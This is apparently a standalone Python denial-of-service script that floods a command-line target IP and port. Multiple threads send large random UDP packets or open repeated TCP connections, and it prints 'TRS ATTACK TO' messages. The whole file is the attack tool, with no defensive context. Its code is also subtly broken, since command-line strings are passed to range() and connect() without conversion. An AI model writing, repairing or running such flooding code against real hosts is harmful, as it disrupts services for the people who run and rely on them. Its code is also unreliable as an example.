#!/usr/bin/env python3
import os
import sys
import random
import socket
import threading
import time

os.system('color ' +random.choice(['a', 'b', 'c', 'd', 'e'])+ " & title KuryuYT")

ip = sys.argv[1]
port = sys.argv[2]
choice = sys.argv[3]
times = sys.argv[4]
threads = sys.argv[5]
def run():
	data = random._urandom(600000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(100048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((ip,port))
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			for x in range(times):
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("TRS ATTACK TO " + ip)

for y in range(threads):
	if choice == "y":
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
